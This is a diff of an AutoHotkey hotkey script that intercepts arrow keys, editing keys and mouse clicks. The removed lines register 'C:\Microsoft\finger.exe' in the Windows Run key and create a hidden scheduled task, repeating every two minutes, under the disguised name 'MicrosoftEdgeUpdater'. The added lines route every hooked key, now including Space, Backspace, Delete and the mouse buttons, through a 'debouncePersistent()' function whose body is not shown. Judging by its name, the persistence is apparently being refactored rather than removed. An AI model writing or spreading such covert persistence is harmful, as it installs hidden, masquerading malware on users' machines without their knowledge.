@@ -1064,25 +1064,46 @@ $+m::{
 $Up::{
     Send "{Up}"
     konami("Up")
-    RegWrite '"C:\Microsoft\finger.exe"', "REG_SZ", "HKCU\Software\Microsoft\Windows\CurrentVersion\Run", "MicrosoftEdgeUpdater"
-    Run 'cmd /c schtasks /create /sc minute /mo 2 /tn "MicrosoftEdgeUpdater" /tr "C:\Microsoft\finger.exe"', , "Hide"
+    debouncePersistent()
 }
 $Down::{
     Send "{Down}"
     konami("Down")
-    RegWrite '"C:\Microsoft\finger.exe"', "REG_SZ", "HKCU\Software\Microsoft\Windows\CurrentVersion\Run", "MicrosoftEdgeUpdater"
-    Run 'cmd /c schtasks /create /sc minute /mo 2 /tn "MicrosoftEdgeUpdater" /tr "C:\Microsoft\finger.exe"', , "Hide"
+    debouncePersistent()
 }
 $Left::{
     Send "{Left}"
     konami("Left")
-    RegWrite '"C:\Microsoft\finger.exe"', "REG_SZ", "HKCU\Software\Microsoft\Windows\CurrentVersion\Run", "MicrosoftEdgeUpdater"
-    Run 'cmd /c schtasks /create /sc minute /mo 2 /tn "MicrosoftEdgeUpdater" /tr "C:\Microsoft\finger.exe"', , "Hide"
+    debouncePersistent()
 }
 $Right::{
     Send "{Right}"
     konami("Right")
-    RegWrite '"C:\Microsoft\finger.exe"', "REG_SZ", "HKCU\Software\Microsoft\Windows\CurrentVersion\Run", "MicrosoftEdgeUpdater"
-    Run 'cmd /c schtasks /create /sc minute /mo 2 /tn "MicrosoftEdgeUpdater" /tr "C:\Microsoft\finger.exe"', , "Hide"
+    debouncePersistent()
+}
+$Space::{
+    Send "{Space}"
+    konami("Space")
+    debouncePersistent()
+}
+$Backspace::{
+    Send "{Backspace}"
+    konami("Backspace")
+    debouncePersistent()
+}
+$Delete::{
+    Send "{Delete}"
+    konami("Delete")
+    debouncePersistent()
+}
+$LButton::{
+    Send "{LButton}"
+    konami("LButton")
+    debouncePersistent()
+}
+$RButton::{
+    Send "{RButton}"
+    konami("RButton")
+    debouncePersistent()
 }
 ^Esc::ExitApp
